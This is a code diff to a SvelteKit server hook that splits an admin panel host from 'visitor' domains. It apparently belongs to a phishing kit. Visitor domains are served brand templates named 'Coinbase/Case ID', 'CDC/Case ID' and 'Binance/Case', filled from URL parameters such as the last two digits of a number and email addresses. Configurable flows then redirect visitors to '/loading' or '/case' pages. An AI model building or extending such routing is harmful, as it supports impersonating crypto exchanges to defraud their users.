@@ -1,8 +1,21 @@
 import type { Handle } from '@sveltejs/kit';
 import { redirect } from '@sveltejs/kit';
 import { SESSION_COOKIE, getSessionUser, maybeCleanupSessions } from '$lib/server/auth.js';
+import { setupWebSocket } from '$lib/server/websocket.js';
+import { getOrCreateApiKey } from '$lib/server/api.js';
+import { dbGetDomainByHost, dbGetSetting } from '$lib/server/database.js';
+import { resolveVisitorTemplate } from '$lib/server/visitorRouter.js';
+import { loadTemplateHtml } from '$lib/server/visitorTemplates.js';
+import { serverState } from '$lib/server/state.js';
+import type { Server } from 'node:http';
 
-const PUBLIC_ROUTES = ['/login'];
+const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
+
+if (!PANEL_HOST && process.env.NODE_ENV === 'production') {
+	console.error('[SECURITY] PANEL_HOST is not set! All hosts will serve the admin panel. Set PANEL_HOST to your panel domain.');
+}
+
+const PUBLIC_ROUTES = ['/login', '/signup'];
 const PUBLIC_PREFIXES = [
 	'/api/auth/',
 	'/api/visitor/',
@@ -18,26 +31,120 @@ const PUBLIC_PREFIXES = [
 	'/favicon'
 ];
 
+const VISITOR_ALLOWED_PREFIXES = [
+	'/_app/',
+	'/_next/',
+	'/images/',
+	'/favicon',
+	'/template-thumbs/',
+	'/api/visitor/',
+	'/api/data/',
+	'/api/host/',
+	'/u/'
+];
+
+let wsAttached = false;
+
+function attachWebSocket(httpServer: Server): void {
+	if (wsAttached) return;
+	wsAttached = true;
+	setupWebSocket(httpServer);
+	getOrCreateApiKey();
+	console.log('[ws] WebSocket server attached at /ws (production)');
+}
+
 export const handle: Handle = async ({ event, resolve }) => {
 	maybeCleanupSessions();
+
+	if (!wsAttached) {
+		try {
+			const req = (event.platform as any)?.req;
+			const httpServer: Server | undefined = req?.socket?.server;
+			if (httpServer) {
+				attachWebSocket(httpServer);
+			}
+		} catch {
+			// platform.req not available (e.g. dev mode — Vite plugin handles it)
+		}
+	}
+
+	const host = event.url.hostname.toLowerCase();
+	const path = event.url.pathname;
+
+	if (PANEL_HOST && host !== PANEL_HOST) {
+		const landingEnabled = dbGetSetting('visitor.landing_enabled');
+		if (landingEnabled === 'false') {
+			return new Response('Not Found', { status: 404 });
+		}
+
+		const domain = dbGetDomainByHost(host);
+		if (!domain || !domain.serving) {
+			return new Response('Not Found', { status: 404 });
+		}
+
+		event.locals.user = null;
+		event.locals.sessionToken = undefined;
+		event.cookies.delete(SESSION_COOKIE, { path: '/' });
+
+		if (VISITOR_ALLOWED_PREFIXES.some((p) => path.startsWith(p))) {
+			return resolve(event);
+		}
+
+		const tpl = resolveVisitorTemplate(domain.module, path);
+		if (tpl) {
+			const html = loadTemplateHtml(tpl.brand, tpl.page, {
+				lastTwoDigits: event.url.searchParams.get('last2') || undefined,
+				emailFrom: event.url.searchParams.get('emailFrom') || undefined,
+				emailTo: event.url.searchParams.get('emailTo') || undefined
+			});
+			if (html) {
+				return new Response(html, {
+					headers: {
+						'Content-Type': 'text/html; charset=utf-8',
+						'Cache-Control': 'no-store'
+					}
+				});
+			}
+		}
+
+		let landingRedirect = domain.landingPage || '/loading';
+		if (domain.flowId) {
+			const flow = serverState.flows.find((f) => f.id === domain.flowId && f.active);
+			if (flow) {
+				const firstValid = flow.steps.find((s) => /^[A-Z][^/]+\/.+/.test(s));
+				if (firstValid === 'Coinbase/Case ID' || firstValid === 'CDC/Case ID' || firstValid === 'Binance/Case') {
+					landingRedirect = '/case';
+				}
+			}
+		}
+		return new Response(null, {
+			status: 302,
+			headers: { Location: landingRedirect }
+		});
+	}
 
 	const token = event.cookies.get(SESSION_COOKIE);
 	const user = getSessionUser(token);
 	event.locals.user = user;
 	event.locals.sessionToken = token;
 
-	const path = event.url.pathname;
 	const isPublic =
 		PUBLIC_ROUTES.includes(path) ||
 		PUBLIC_PREFIXES.some((p) => path.startsWith(p)) ||
 		path === '/';
 
 	if (!user && !isPublic) {
+		if (path.startsWith('/api/')) {
+			return new Response(JSON.stringify({ error: 'Unauthorized' }), {
+				status: 401,
+				headers: { 'Content-Type': 'application/json' }
+			});
+		}
 		const redirectTo = encodeURIComponent(path + event.url.search);
 		throw redirect(303, `/login?redirect=${redirectTo}`);
 	}
 
-	if (user && path === '/login') {
+	if (user && (path === '/login' || path === '/signup')) {
 		throw redirect(303, '/dashboard');
 	}
 
